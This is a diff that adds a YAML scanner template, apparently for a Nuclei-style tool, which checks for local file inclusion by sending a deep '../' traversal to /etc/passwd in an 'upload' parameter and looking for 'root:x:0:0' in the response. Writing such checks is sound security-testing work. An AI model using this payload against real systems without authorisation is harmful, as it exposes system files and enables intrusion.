@@ -1,0 +1,20 @@
+id: lfi7-170
+name: 'Deep traversal in upload'
+severity: high
+type: active
+tags:
+  - lfi
+  - traversal
+  - file
+description: 'Reads sensitive file via upload'
+requests:
+  - method: GET
+    path: '{{BaseURL}}'
+    payloads:
+      upload:
+        - '../../../../../../../../../../../etc/passwd'
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'root:x:0:0'
